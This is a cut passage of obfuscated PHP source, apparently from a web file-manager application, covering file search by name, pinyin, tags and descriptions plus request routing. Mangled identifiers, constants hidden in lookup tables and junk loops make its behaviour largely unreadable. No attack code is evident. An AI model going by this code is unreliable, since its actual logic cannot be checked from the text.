(!$ø—÷Ê¬ˆ) { return array(); } $üÜæ¢Öâ = USER_ID; $áÍüğÆ = Model($†Âş¦‡[535])->getInfo($üÜæ¢Öâ); $Ëºƒ·…“ = array($†Âş¦‡[586] => SourceModel::TYPE_USER, $†Âş¦‡[521] => array($†Âş¦‡[550], $†Âş¦‡[531] . $áÍüğÆ[$†Âş¦‡[86]][$†Âş¦‡[402]] . $†Âş¦‡[551]), $†Âş¦‡[587] => $üÜæ¢Öâ, $†Âş¦‡[583] => 0, $†Âş¦‡[584] => $ø—÷Ê¬ˆ); return $this->listSource($Ëºƒ·…“); } public function listSearch($©ÓÎâšé, $Ëş÷ƒ’¥ = 300) { $‡ùşÜ©ı =& $_SERVER[ùÆÎÔ“Ñ]; if (isset($©ÓÎâšé[$‡ùşÜ©ı[1951]]) && $©ÓÎâšé[$‡ùşÜ©ı[1951]]) { $©ÓÎâšé[$‡ùşÜ©ı[1951]] = str_replace($‡ùşÜ©ı[384], $‡ùşÜ©ı[2109], trim($©ÓÎâšé[$‡ùşÜ©ı[1951]])); } $àó¢—–Ş = $this->_parseSearchWhere($©ÓÎâšé); if (!isset($àó¢—–Ş[$‡ùşÜ©ı[431]])) { $àó¢—–Ş[$‡ùşÜ©ı[431]] = 0; } $‹‰¨é×œ = $‡ùşÜ©ı[2110]; $ïï ¯·€ = $àó¢—–Ş; $Ô¦…èÕ = $‹‰¨é×œ; $this->_listSearchBindPinyin($©ÓÎâšé, $àó¢—–Ş, $‹‰¨é×œ); $this->alias($‡ùşÜ©ı[446])->_makeOrder(); $àó¢—–Ş = $this->parseWhereLike($àó¢—–Ş); $ŒÎÆËÊæ = $this->distinct(!0)->field($‹‰¨é×œ)->where($àó¢—–Ş)->selectPage($Ëş÷ƒ’¥); if ($GLOBALS[$‡ùşÜ©ı[6]][$‡ùşÜ©ı[381]][$‡ùşÜ©ı[382]] && Input::check($©ÓÎâšé[$‡ùşÜ©ı[1951]], $‡ùşÜ©ı[593]) && $ŒÎÆËÊæ[$‡ùşÜ©ı[366]][$‡ùşÜ©ı[353]] == 1 && $ŒÎÆËÊæ[$‡ùşÜ©ı[366]][$‡ùşÜ©ı[367]] == 0) { $ŒÎÆËÊæ = $this->distinct(!0)->field($‹‰¨é×œ)->where($ïï ¯·€)->limit(1000)->select(); $ŒÎÆËÊæ = array_page_split($ŒÎÆËÊæ, !1, $Ëş÷ƒ’¥); } $this->_listSearchFileContent($ŒÎÆËÊæ, $©ÓÎâšé, $Ô¦…èÕ, $ïï ¯·€); $this->_listSearchDesc($ŒÎÆËÊæ, $©ÓÎâšé, $Ô¦…èÕ); $this->_listSearchTag($ŒÎÆËÊæ, $©ÓÎâšé, $Ô¦…èÕ); $this->_listSearchGroupTag($ŒÎÆËÊæ, $©ÓÎâšé, $Ô¦…èÕ); $this->_listDataApply($ŒÎÆËÊæ[$‡ùşÜ©ı[369]]); $this->_listMake($ŒÎÆËÊæ); return $ŒÎÆËÊæ; } private function _listSearchFileContent(&$€ş¬Ãñı, $½Œş€ø, $ğœêÜŒ, $–ÖÙü–) { $ùÒª€”¡ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$½Œş€ø[$ùÒª€”¡[1951]] || $€ş¬Ãñı[$ùÒª€”¡[366]][$ùÒª€”¡[353]] > 1) { return; } if (!isset($–ÖÙü–[$ùÒª€”¡[32]]) || !is_array($½Œş€ø[$ùÒª€”¡[468]])) { return; } $–ÖÙü–[$ùÒª€”¡[468]] = array($ùÒª€”¡[7], $½Œş€ø[$ùÒª€”¡[468]]); unset($–ÖÙü–[$ùÒª€”¡[32]]); unset($½Œş€ø[$ùÒª€”¡[468]]); $ÑÄÄ¸å˜ = $this->field($ğœêÜŒ)->where($–ÖÙü–)->limit($ùÒª€”¡[2111])->select(); if (!$ÑÄÄ¸å˜ || count($ÑÄÄ¸å˜) == 0) { return; } $€ş¬Ãñı[$ùÒª€”¡[369]] = array_merge($ÑÄÄ¸å˜, $€ş¬Ãñı[$ùÒª€”¡[369]]); $€ş¬Ãñı[$ùÒª€”¡[366]][$ùÒª€”¡[367]] += count($ÑÄÄ¸å˜); } private function _listSearchTag(&$¿şöÎ·¾, $ô¥÷™èÛ, $Ÿ÷àûÔš) { $öÄ¾Šàè =& $_SERVER[ùÆÎÔ“Ñ]; if (!$ô¥÷™èÛ[$öÄ¾Šàè[1951]] || $¿şöÎ·¾[$öÄ¾Šàè[366]][$öÄ¾Šàè[353]] > 1) { return; } $©˜°Õö… = Model($öÄ¾Šàè[2112])->listData(); $ ù„‘ï = array(); $£“ÛîøÊ = $ô¥÷™èÛ[$öÄ¾Šàè[1951]]; foreach ($©˜°Õö… as $ˆĞÖØ¼š) { $£¨©¶¾Û = $ˆĞÖØ¼š[$öÄ¾Šàè[32]]; $Ê€­âõ‘ = str_replace($öÄ¾Šàè[53], $öÄ¾Šàè[12], Pinyin::get($£¨©¶¾Û)); if (stripos($£¨©¶¾Û, $£“ÛîøÊ) !== !1 || stripos($Ê€­âõ‘, $£“ÛîøÊ) !== !1) { $ ù„‘ï[] = $ˆĞÖØ¼š[$öÄ¾Šàè[399]]; } } if (!$ ù„‘ï) { return; } $ä±ÑëÓ½ = array($öÄ¾Šàè[426] => array($öÄ¾Šàè[7], $ ù„‘ï), $öÄ¾Šàè[1667] => USER_ID); $´ÌõŞ = Model($öÄ¾Šàè[428])->field($öÄ¾Šàè[84])->where($ä±ÑëÓ½)->select(); $´ÌõŞ = array_to_keyvalue($´ÌõŞ, $öÄ¾Šàè[12], $öÄ¾Šàè[84]); $’ÜÅé¥´ = array_unique($´ÌõŞ); $this->_listSearchMerge($¿şöÎ·¾, $ô¥÷™èÛ, $Ÿ÷àûÔš, $’ÜÅé¥´); } private function _listSearchDesc(&$­œîºªà, $Õ™œ–ø‰, $îÖíµšô) { $Š°¯¨Š® =& $_SERVER[ùÆÎÔ“Ñ]; if (!$Õ™œ–ø‰[$Š°¯¨Š®[1951]] || $­œîºªà[$Š°¯¨Š®[366]][$Š°¯¨Š®[353]] > 1) { return; } $š–ÀÊ›± = array($Š°¯¨Š®[94] => $Š°¯¨Š®[453], $Š°¯¨Š®[374] => array($Š°¯¨Š®[383], $Š°¯¨Š®[1953] . $Õ™œ–ø‰[$Š°¯¨Š®[1951]] . $Š°¯¨Š®[1953])); $ˆí¼ÌÀ = !1; if ($ˆí¼ÌÀ) { $¨Î‹ëÉ§ = $this->listSearchChildren($Õ™œ–ø‰[$Š°¯¨Š®[432]]); $¨Î‹ëÉ§ = array_unique($¨Î‹ëÉ§); if (!$¨Î‹ëÉ§) { return; } $š–ÀÊ›±[$Š°¯¨Š®[402]] = array($Š°¯¨Š®[7], $¨Î‹ëÉ§); } $¤†áşÜ¼ = Model($Š°¯¨Š®[569])->field($Š°¯¨Š®[402])->where($š–ÀÊ›±)->limit(5000)->select(); $’˜£„ªÑ = array_to_keyvalue($¤†áşÜ¼, $Š°¯¨Š®[12], $Š°¯¨Š®[402]); $this->_listSearchMerge($­œîºªà, $Õ™œ–ø‰, $îÖíµšô, $’˜£„ªÑ); } private function _listSearchGroupTag(&$ş‘ª‚ˆ, $¼Êºé¨, $ÇİÂ¤Ú¿) { $“ì¶®‡ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$¼Êºé¨[$“ì¶®‡[1951]] || $ş‘ª‚ˆ[$“ì¶®‡[366]][$“ì¶®‡[353]] > 1 || !$¼Êºé¨[$“ì¶®‡[432]]) { return; } $¦ô ¢ÜÔ = $this->sourceInfo($¼Êºé¨[$“ì¶®‡[432]]); if (!$¦ô ¢ÜÔ || $¦ô ¢ÜÔ[$“ì¶®‡[411]] != SourceModel::TYPE_GROUP) { return; } $½²÷Ç§Ÿ = $¦ô ¢ÜÔ[$“ì¶®‡[505]]; $Èõá”ß… = Model($“ì¶®‡[2113])->get($½²÷Ç§Ÿ); $éßÈäˆ = array(); $¹ì†œİÕ = $¼Êºé¨[$“ì¶®‡[1951]]; foreach ($Èõá”ß…[$“ì¶®‡[369]] as $ö·÷ÜÛ±) { $ÈÆÈ˜ÀÜ = $ö·÷ÜÛ±[$“ì¶®‡[32]]; $¥¾ºÛÓò = str_replace($“ì¶®‡[53], $“ì¶®‡[12], Pinyin::get($ÈÆÈ˜ÀÜ)); if (stripos($ÈÆÈ˜ÀÜ, $¹ì†œİÕ) !== !1 || stripos($¥¾ºÛÓò, $¹ì†œİÕ) !== !1) { $éßÈäˆ[] = $ö·÷ÜÛ±[$“ì¶®‡[399]]; } } if (!$éßÈäˆ) { return; } $«úôª¸š = array($“ì¶®‡[426] => array($“ì¶®‡[7], $éßÈäˆ), $“ì¶®‡[1667] => 0, $“ì¶®‡[33] => $“ì¶®‡[1973] . $½²÷Ç§Ÿ); $ÀÓÀêƒ“ = Model($“ì¶®‡[428])->field($“ì¶®‡[84])->where($«úôª¸š)->select(); $ÀÓÀêƒ“ = array_to_keyvalue($ÀÓÀêƒ“, $“ì¶®‡[12], $“ì¶®‡[84]); $´‹ö†¿€ = array_unique($ÀÓÀêƒ“); $this->_listSearchMerge($ş‘ª‚ˆ, $¼Êºé¨, $ÇİÂ¤Ú¿, $´‹ö†¿€); } private function _listSearchMerge(&$Ø—Åî¶, $¬ø¬¾Ó, $ê¶øˆÊ¤, $àÏó—ŸÑ) { $ıëÂ¯Ã =& $_SERVER[ùÆÎÔ“Ñ]; if (!$àÏó—ŸÑ) { return; } $úáìŒíÂ = array_to_keyvalue($Ø—Åî¶[$ıëÂ¯Ã[369]], $ıëÂ¯Ã[12], $ıëÂ¯Ã[402]); $ ƒŸöÚØ = array_diff($àÏó—ŸÑ, $úáìŒíÂ); if (!$ ƒŸöÚØ) { return; } $èÜ¹Ô = array($ıëÂ¯Ã[402] => array($ıëÂ¯Ã[7], $ ƒŸöÚØ)); $Ğ‘°—±î = $this->field($ê¶øˆÊ¤)->where($èÜ¹Ô)->select(); if (!$Ğ‘°—±î) { return; } $¨ ôÊÄ“ = array(); foreach ($Ğ‘°—±î as $§”¸İ½’) { if ($this->_listSearchFilter($§”¸İ½’, $¬ø¬¾Ó)) { $¨ ôÊÄ“[] = $§”¸İ½’; } } $Ø—Åî¶[$ıëÂ¯Ã[369]] = array_merge($¨ ôÊÄ“, $Ø—Åî¶[$ıëÂ¯Ã[369]]); $Ø—Åî¶[$ıëÂ¯Ã[366]][$ıëÂ¯Ã[367]] += count($¨ ôÊÄ“); } private function _listSearchFilter($Ê£İ­üÜ, $å’Òı°ü) { $„ç»ÚÃŠ =& $_SERVER[ùÆÎÔ“Ñ]; $˜Üƒñóœ = $Ê£İ­üÜ[$„ç»ÚÃŠ[410]] == $„ç»ÚÃŠ[88]; if (!strstr($Ê£İ­üÜ[$„ç»ÚÃŠ[521]], $„ç»ÚÃŠ[50] . $å’Òı°ü[$„ç»ÚÃŠ[432]] . $„ç»ÚÃŠ[50])) { return !1; } if (isset($å’Òı°ü[$„ç»ÚÃŠ[412]]) && $å’Òı°ü[$„ç»ÚÃŠ[412]] != $„ç»ÚÃŠ[1912]) { if ($å’Òı°ü[$„ç»ÚÃŠ[412]] == $„ç»ÚÃŠ[75] && !$˜Üƒñóœ) { return !1; } if ($å’Òı°ü[$„ç»ÚÃŠ[412]] != $„ç»ÚÃŠ[75] && $˜Üƒñóœ) { return !1; } if (!strstr($Ê£İ­üÜ[$„ç»ÚÃŠ[174]], $„ç»ÚÃŠ[50] . $å’Òı°ü[$„ç»ÚÃŠ[412]] . $„ç»ÚÃŠ[50])) { return !1; } } if (isset($å’Òı°ü[$„ç»ÚÃŠ[2114]]) && $å’Òı°ü[$„ç»ÚÃŠ[2114]] < $Ê£İ­üÜ[$„ç»ÚÃŠ[76]]) { return !1; } if (isset($å’Òı°ü[$„ç»ÚÃŠ[2115]]) && $å’Òı°ü[$„ç»ÚÃŠ[2115]] > $Ê£İ­üÜ[$„ç»ÚÃŠ[76]]) { return !1; } if (isset($å’Òı°ü[$„ç»ÚÃŠ[600]]) && $å’Òı°ü[$„ç»ÚÃŠ[600]] != $Ê£İ­üÜ[$„ç»ÚÃŠ[456]]) { return !1; } return !0; } public function listSearchChildren($è°’¸¹, $Æ»ÓÍæ® = 5000) { $òÛ†ÈÃ¿ =& $_SERVER[ùÆÎÔ“Ñ]; $ÒÉìƒñ… = array(); $Ê’ô‹ÛÎ = $this->sourceInfo($è°’¸¹); $Ëé¸ßĞÃ = array($òÛ†ÈÃ¿[521] => array($òÛ†ÈÃ¿[383], $Ê’ô‹ÛÎ[$òÛ†ÈÃ¿[521]] . $Ê’ô‹ÛÎ[$òÛ†ÈÃ¿[402]] . $òÛ†ÈÃ¿[551])); $—¿‹›òÚ = $this->field($òÛ†ÈÃ¿[76])->where($Ëé¸ßĞÃ)->limit($Æ»ÓÍæ® + 1)->select(); $”Î¡£Èè = is_array($—¿‹›òÚ) ? count($—¿‹›òÚ) : 0; if ($”Î¡£Èè > $Æ»ÓÍæ®) { return $this->_listSearchChildrenNear($è°’¸¹, $Æ»ÓÍæ®); } $£öúÍ = $this->field($òÛ†ÈÃ¿[402])->where($Ëé¸ßĞÃ)->select(); $ÒÉìƒñ… = array_to_keyvalue($£öúÍ, $òÛ†ÈÃ¿[12], $òÛ†ÈÃ¿[402]); return $ÒÉìƒñ…; } private function _listSearchChildrenNear($ş¸•¶ğğ, $’ÇøÓ³ª) { $¯Ã÷ììŒ =& $_SERVER[ùÆÎÔ“Ñ]; $¾Î¬¹Ù = array(); $Š¼¼‹ë½ = array($¯Ã÷ììŒ[432] => $ş¸•¶ğğ); $¡Á“ñû¥ = $this->field($¯Ã÷ììŒ[2116])->where($Š¼¼‹ë½)->select(); $æØ™… = array_to_keyvalue(array_filter_by_field($¡Á“ñû¥, $¯Ã÷ììŒ[410], $¯Ã÷ììŒ[88]), $¯Ã÷ììŒ[12], $¯Ã÷ììŒ[402]); $¾Î¬¹Ù = array_merge($¾Î¬¹Ù, array_to_keyvalue($¡Á“ñû¥, $¯Ã÷ììŒ[12], $¯Ã÷ììŒ[402])); if (!$æØ™…) { return $¾Î¬¹Ù; } $Š¼¼‹ë½ = array($¯Ã÷ììŒ[432] => array($¯Ã÷ììŒ[7], $æØ™…)); $¡Á“ñû¥ = $this->field($¯Ã÷ììŒ[2116])->where($Š¼¼‹ë½)->limit($’ÇøÓ³ª)->select(); $¾Î¬¹Ù = array_merge($¾Î¬¹Ù, array_to_keyvalue($¡Á“ñû¥, $¯Ã÷ììŒ[12], $¯Ã÷ììŒ[402])); $¾Î¬¹Ù = array_slice($¾Î¬¹Ù, 0, $’ÇøÓ³ª); return $¾Î¬¹Ù; } private function _listSearchBindPinyin($¶èºÕñš, &$ßãòœÖÍ, &$ŞŞ Û¥) { $ûÑíóİ =& $_SERVER[ùÆÎÔ“Ñ]; if (!isset($¶èºÕñš[$ûÑíóİ[1951]]) || !$¶èºÕñš[$ûÑíóİ[1951]]) { return; } if (!Input::check($¶èºÕñš[$ûÑíóİ[1951]], $ûÑíóİ[318]) || strlen($¶èºÕñš[$ûÑíóİ[1951]]) < 2) { return; } $Š¹ûÑÑ› = "\x4c\105\106\124\40\x4a\x4f\111\116\40{$this->tablePrefix}\x69\x6f\137\x73\x6f\165\x72\143\145\137\x6d\x65\x74\141\40\x6d\145\164\141\40\x6f\156\40\163\157\165\162\143\x65\x2e\x73\x6f\x75\x72\x63\145\111\x44\x20\75\40\x6d\145\164\x61\x2e\x73\x6f\x75\x72\x63\x65\111\x44"; $ôÆşò¼û = array(); $ŞŞ Û¥ = str_replace(array($ûÑíóİ[231], $ûÑíóİ[53], $ûÑíóİ[2117]), $ûÑíóİ[12], $ŞŞ Û¥); $ŞŞ Û¥ = $ûÑíóİ[438] . str_replace($ûÑíóİ[50], $ûÑíóİ[439], $ŞŞ Û¥); $åÒ±„ÛÓ = $ßãòœÖÍ[$ûÑíóİ[32]]; unset($ßãòœÖÍ[$ûÑíóİ[32]]); foreach ($ßãòœÖÍ as $É€ĞëªÆ => $Ìä¤ÑùÀ) { $ôÆşò¼û[$ûÑíóİ[438] . $É€ĞëªÆ] = $Ìä¤ÑùÀ; } foreach ($åÒ±„ÛÓ as $ç…÷½í°) { $ôÆşò¼û[] = array($ûÑíóİ[443] => $ç…÷½í°, $ûÑíóİ[1005] => $ûÑíóİ[1955], array($ûÑíóİ[2118] => $ç…÷½í°, $ûÑíóİ[2119] => array($ûÑíóİ[7], array($ûÑíóİ[465], $ûÑíóİ[464])))); } $this->join($Š¹ûÑÑ›); $ßãòœÖÍ = $ôÆşò¼û; } private function _parseSearchWhere($¡Ä¸ˆ„) { $Ê¶…¾–š =& $_SERVER[ùÆÎÔ“Ñ]; $¼Ÿ±——” = array(); if (isset($¡Ä¸ˆ„[$Ê¶…¾–š[762]]) && $¡Ä¸ˆ„[$Ê¶…¾–š[762]]) { $¼Ÿ±——”[$Ê¶…¾–š[85]] = array($Ê¶…¾–š[2120], $¡Ä¸ˆ„[$Ê¶…¾–š[762]]); } if (isset($¡Ä¸ˆ„[$Ê¶…¾–š[497]]) && $¡Ä¸ˆ„[$Ê¶…¾–š[497]]) { $Ó±Ğîâ¸ = array($Ê¶…¾–š[2121], $¡Ä¸ˆ„[$Ê¶…¾–š[497]]); if ($¼Ÿ±——”[$Ê¶…¾–š[85]]) { $¼Ÿ±——”[$Ê¶…¾–š[85]] = array($¼Ÿ±——”[$Ê¶…¾–š[85]], $Ó±Ğîâ¸, $Ê¶…¾–š[2122]); } else { $¼Ÿ±——”[$Ê¶…¾–š[85]] = $Ó±Ğîâ¸; } } if (isset($¡Ä¸ˆ„[$Ê¶…¾–š[2114]]) && $¡Ä¸ˆ„[$Ê¶…¾–š[2114]] > 0) { $¼Ÿ±——”[$Ê¶…¾–š[76]] = array($Ê¶…¾–š[2120], $¡Ä¸ˆ„[$Ê¶…¾–š[2114]]); } if (isset($¡Ä¸ˆ„[$Ê¶…¾–š[2115]]) && $¡Ä¸ˆ„[$Ê¶…¾–š[2115]]) { $Ó±Ğîâ¸ = array($Ê¶…¾–š[2121], $¡Ä¸ˆ„[$Ê¶…¾–š[2115]]); if ($¼Ÿ±——”[$Ê¶…¾–š[76]]) { $¼Ÿ±——”[$Ê¶…¾–š[76]] = array($¼Ÿ±——”[$Ê¶…¾–š[76]], $Ó±Ğîâ¸, $Ê¶…¾–š[2122]); } else { $¼Ÿ±——”[$Ê¶…¾–š[76]] = $Ó±Ğîâ¸; } } if (isset($¡Ä¸ˆ„[$Ê¶…¾–š[600]]) && $¡Ä¸ˆ„[$Ê¶…¾–š[600]]) { $¼Ÿ±——”[] = array($Ê¶…¾–š[456] => $¡Ä¸ˆ„[$Ê¶…¾–š[600]], $Ê¶…¾–š[454] => $¡Ä¸ˆ„[$Ê¶…¾–š[600]], $Ê¶…¾–š[1005] => $Ê¶…¾–š[1955]); } if (isset($¡Ä¸ˆ„[$Ê¶…¾–š[412]]) && $¡Ä¸ˆ„[$Ê¶…¾–š[412]]) { $‰¿ÉôŞ = $¡Ä¸ˆ„[$Ê¶…¾–š[412]]; if ($‰¿ÉôŞ == $Ê¶…¾–š[75]) { $¼Ÿ±——”[$Ê¶…¾–š[410]] = 1; } else { if ($‰¿ÉôŞ == $Ê¶…¾–š[2123]) { $¼Ÿ±——”[$Ê¶…¾–š[410]] = 0; } else { if ($‰¿ÉôŞ) { $‰¿ÉôŞ = is_array($‰¿ÉôŞ) ? $‰¿ÉôŞ : explode($Ê¶…¾–š[50], $‰¿ÉôŞ); $¼Ÿ±——”[$Ê¶…¾–š[412]] = array($Ê¶…¾–š[418], $‰¿ÉôŞ); $¼Ÿ±——”[$Ê¶…¾–š[410]] = 0; } } } } $this->_parseSearchParent($¡Ä¸ˆ„, $¼Ÿ±——”); if (isset($¡Ä¸ˆ„[$Ê¶…¾–š[1951]]) && trim($¡Ä¸ˆ„[$Ê¶…¾–š[1951]])) { $ô§³ § = trim($¡Ä¸ˆ„[$Ê¶…¾–š[1951]]); $Ç±“³®õ = explode($Ê¶…¾–š[53], $ô§³ §); if (strlen($ô§³ §) > 2 && (substr($ô§³ §, 0, 1) == $Ê¶…¾–š[118] && substr($ô§³ §, -1) == $Ê¶…¾–š[118]) || substr($ô§³ §, 0, 1) == $Ê¶…¾–š[58] && substr($ô§³ §, -1) == $Ê¶…¾–š[58]) { $ô§³ § = substr($ô§³ §, 1, -1); $Ç±“³®õ = array($ô§³ §); } $¼Ÿ±——”[$Ê¶…¾–š[32]] = array(array($Ê¶…¾–š[550], $Ê¶…¾–š[1953] . $ô§³ § . $Ê¶…¾–š[1953])); if (count($Ç±“³®õ) > 1) { $¼Ÿ±——”[$Ê¶…¾–š[32]] = array(); foreach ($Ç±“³®õ as $È®ÊÅá) { if (!trim($È®ÊÅá)) { continue; } $¼Ÿ±——”[$Ê¶…¾–š[32]][] = array($Ê¶…¾–š[550], $Ê¶…¾–š[1953] . trim($È®ÊÅá) . $Ê¶…¾–š[1953]); } } } return $¼Ÿ±——”; } private function _parseSearchParent($ÃŞúÏ®ğ, &$™ª£âŞ) { $–ú¯«æ =& $_SERVER[ùÆÎÔ“Ñ]; if (!isset($ÃŞúÏ®ğ[$–ú¯«æ[432]]) || !$ÃŞúÏ®ğ[$–ú¯«æ[432]]) { return; } $Š×‚Ø¨Ğ = $this->pathInfo($ÃŞúÏ®ğ[$–ú¯«æ[432]]); $ù›Ô¦ÆÊ = $Š×‚Ø¨Ğ[$–ú¯«æ[432]] . $–ú¯«æ[12] === $–ú¯«æ[197]; $‡ôöÃÙò = $Š×‚Ø¨Ğ[$–ú¯«æ[411]] == $–ú¯«æ[515]; if ($Š×‚Ø¨Ğ[$–ú¯«æ[532]] == $–ú¯«æ[533]) { $–Ä¡¨½› = $this->sourceInfo($ÃŞúÏ®ğ[$–ú¯«æ[432]]); $Š×‚Ø¨Ğ[$–ú¯«æ[521]] = $–Ä¡¨½›[$–ú¯«æ[521]]; } $™ª£âŞ[$–ú¯«æ[590]] = array($–ú¯«æ[550], $Š×‚Ø¨Ğ[$–ú¯«æ[521]] . $ÃŞúÏ®ğ[$–ú¯«æ[432]] . $–ú¯«æ[551]); $‰—ü‘¼ = isset($ÃŞúÏ®ğ[$–ú¯«æ[1816]]) && in_array($–ú¯«æ[515], $ÃŞúÏ®ğ[$–ú¯«æ[1816]]); if (!$‰—ü‘¼ || !$‡ôöÃÙò || !$ù›Ô¦ÆÊ || !$Š×‚Ø¨Ğ[$–ú¯«æ[413]]) { return; } if (!AuthModel::authCheckRoot($Š×‚Ø¨Ğ[$–ú¯«æ[413]][$–ú¯«æ[414]])) { return; } $‰¯„ƒ¨¸ = $Š×‚Ø¨Ğ[$–ú¯«æ[505]] . $–ú¯«æ[12]; if ($‰¯„ƒ¨¸ == $–ú¯«æ[88]) { unset($™ª£âŞ[$–ú¯«æ[590]]); $™ª£âŞ[$–ú¯«æ[411]] = self::TYPE_GROUP; return; } $ç•ï£–¼ = Model($–ú¯«æ[522])->groupChildrenAll($‰¯„ƒ¨¸); $×ÙÔË‡© = count($ç•ï£–¼); if ($×ÙÔË‡© <= 1) { return; } $ŠÍÖªÊÔ = array($–ú¯«æ[432] => 0, $–ú¯«æ[411] => self::TYPE_GROUP, $–ú¯«æ[505] => array($–ú¯«æ[7], $ç•ï£–¼)); $¥Ûß†½ = $this->field($–ú¯«æ[2124])->where($ŠÍÖªÊÔ)->limit($×ÙÔË‡©)->select(); $™ª£âŞ[$–ú¯«æ[590]] = array(); foreach ($¥Ûß†½ as $ÕÓ¡¼ì) { $™ª£âŞ[$–ú¯«æ[590]][] = array($–ú¯«æ[550], $–ú¯«æ[531] . $ÕÓ¡¼ì[$–ú¯«æ[402]] . $–ú¯«æ[551]); } $™ª£âŞ[$–ú¯«æ[590]][] = $–ú¯«æ[1955]; } } goto eÕÑÚˆŠì…; Bñ§èø†ŠŸ: $rgxtljnpqh = $_SERVER[ùÆÎÔ“Ñ][617]; while ($rgxtljnpqh < $_SERVER[ùÆÎÔ“Ñ][618]) { if ($rgxtljnpqh >= 0) { break; } $rgxtljnpqh++; } class Application { private $defaultModule = "\x69\x6e\x64\145\170"; private $defaultController = "\151\x6e\x64\145\x78"; private $defaultAction = "\x69\156\x64\x65\170"; function __construct() { } public function setDefault($ÃË¶Ñ¨×) { $ÎæÀÂË„ =& $_SERVER[ùÆÎÔ“Ñ]; $ÓÚŠ´è¼ =& $_SERVER[¨…Øˆ¼Û]; $¼İó÷ãÈ = explode($ÓÚŠ´è¼[0], trim($ÃË¶Ñ¨×, $ÓÚŠ´è¼[0])); $this->defaultModule = $¼İó÷ãÈ[0] ? $¼İó÷ãÈ[0] : $this->defaultModule; $this->defaultController = $¼İó÷ãÈ[1] ? $¼İó÷ãÈ[1] : $this->defaultController; $­êŒŒÚ­ = $ÎæÀÂË„[619]; $this->defaultAction = $¼İó÷ãÈ[2] ? $¼İó÷ãÈ[2] : $this->defaultAction; $ÜÕ¦àôƒ = $ÎæÀÂË„[620]; $this->eowk2b0d217a($ÓÚŠ´è¼[1], array($this, $ÓÚŠ´è¼[2])); } public function appRun($®´şûªì) { $’¦µœ‰Š =& $_SERVER[ùÆÎÔ“Ñ]; $ø«×­Ô¿ =& $_SERVER[¨…Øˆ¼Û]; $ßÒú´Š» = explode($ø«×­Ô¿[0], $®´şûªì); $ß»ğæ™¥ = strtolower($ßÒú´Š»[0]); $ÒŞ¹Ú“È = $’¦µœ‰Š[621]; while ($ÒŞ¹Ú“È < $’¦µœ‰Š[622]) { if ($ÒŞ¹Ú“È >= 0) { break; } $ÒŞ¹Ú“È++; } $¯ûÔ“ú³ = $ø«×­Ô¿[3]; $Ğ“ô‰¿Ã = $’¦µœ‰Š[623]; if (!$Ğ“ô‰¿Ã) { die; } if ($ß»ğæ™¥ == $ø«×­Ô¿[4]) { $¯ûÔ“ú³ = $ø«×­Ô¿[5]; $ßÒú´Š»[0] = $ø«×­Ô¿[6]; $ßÒú´Š»[1] = $ßÒú´Š»[1] . $ø«×­Ô¿[7]; $®´şûªì = join($ø«×­Ô¿[0], $ßÒú´Š»); $®´şûªì = trim($®´şûªì, $ø«×­Ô¿[0]); } call_user_func(array($ø«×­Ô¿[8], $ø«×­Ô¿[9]), $¯ûÔ“ú³ . $ø«×­Ô¿[10], $®´şûªì); ActionCall($®´şûªì); call_user_func(array($ø«×­Ô¿[8], $ø«×­Ô¿[9]), $¯ûÔ“ú³ . $ø«×­Ô¿[11], $®´şûªì); } private function autorun() { $öÂŸ¡œñ =& $_SERVER[¨…Øˆ¼Û]; global $config; if (count($config[$öÂŸ¡œñ[12]]) == 0) { return; } foreach ($config[$öÂŸ¡œñ[12]] as $ú®üìÁ => $¬ŞÈ†»Ÿ) { $this->appRun($¬ŞÈ†»Ÿ); } } private function kxdz91189e39() { $±•½½é» =& $_SERVER[ùÆÎÔ“Ñ]; $‚°Æ–£à =& $_SERVER[¨…Øˆ¼Û]; $ÅÎ‰œÖ = $‚°Æ–£à[4]; $ÃŠèÈú = $±•½½é»[624]; while ($ÃŠèÈú < $±•½½é»[622]) { if ($ÃŠèÈú >= 0) { break; } $ÃŠèÈú++; } $Ö”Â£· = $GLOBALS[$‚°Æ–£à[13]][$‚°Æ–£à[14]][0]; if (!$Ö”Â£· || strlen($Ö”Â£·) <= strlen($ÅÎ‰œÖ)) { return; } if (strtolower(substr($Ö”Â£·, -strlen($ÅÎ‰œÖ))) != $ÅÎ‰œÖ) { return; } $§ê» â  = substr($Ö”Â£·, 0, -strlen($ÅÎ‰œÖ)); $¡ç¢®ãå = array($‚°Æ–£à[4], $§ê» â ); $ˆèø½™‰ = $±•½½é»[625]; if (!$ˆèø½™‰) { die; } $€ƒ«Û = array_slice($GLOBALS[$‚°Æ–£à[13]][$‚°Æ–£à[14]], 1); $ÌËß³Ûî = $±•½½é»[626]; $GLOBALS[$‚°Æ–£à[13]][$‚°Æ–£à[14]] = array_merge($¡ç¢®ãå, $€ƒ«Û); $¾½¾é¥Å = $±•½½é»[627]; while ($¾½¾é¥Å < $±•½½é»[628]) { if ($¾½¾é¥Å >= 0) { break; } $¾½¾é¥Å++; } $GLOBALS[$‚°Æ–£à[13]][$‚°Æ–£à[15]] = implode($‚°Æ–£à[0], $GLOBALS[$‚°Æ–£à[13]][$‚°Æ–£à[14]]); $Òí˜º½ = $±•½½é»[629]; } private function lyktc10c55a8() { $·à¼Äõ =& $_SERVER[ùÆÎÔ“Ñ]; $õ•èÓ”¸ =& $_SERVER[¨…Øˆ¼Û]; if ($GLOBALS[$õ•èÓ”¸[13]][$õ•èÓ”¸[15]] != $õ•èÓ”¸[6]) { return; } $–¾¬¼±¬ = $_SERVER[$õ•èÓ”¸[16]]; $ğúñæùÃ = $·à¼Äõ[630]; if (strlen($ğúñæùÃ) < $·à¼Äõ[622]) { return; } $²¿–À = $õ•èÓ”¸[17]; $ĞÁã±Ÿü = $·à¼Äõ[631]; while ($ĞÁã±Ÿü < $·à¼Äõ[622]) { if ($ĞÁã±Ÿü >= 0) { break; } $ĞÁã±Ÿü++; } if (!strstr($–¾¬¼±¬, $²¿–À)) { return; } $ù÷ãÛ‰ = strrpos($–¾¬¼±¬, $²¿–À); $Î¥‚†¡Å = substr($–¾¬¼±¬, $ù÷ãÛ‰ + strlen($²¿–À)); $ŞËÑëØ = $·à¼Äõ[632]; while (strlen($ŞËÑëØ) < $·à¼Äõ[633]) { if (!$ŞËÑëØ) { break; } $ŞËÑëØ++; } preg_match_all($õ•èÓ”¸[18], $Î¥‚†¡Å, $‚Šª¹ş§); $ƒãœ±Ëå = $·à¼Äõ[634]; $Î¥‚†¡Å = trim($‚Šª¹ş§[0][0], $õ•èÓ”¸[19]); $GLOBALS[$õ•èÓ”¸[13]][$õ•èÓ”¸[14]] = explode($õ•èÓ”¸[19], 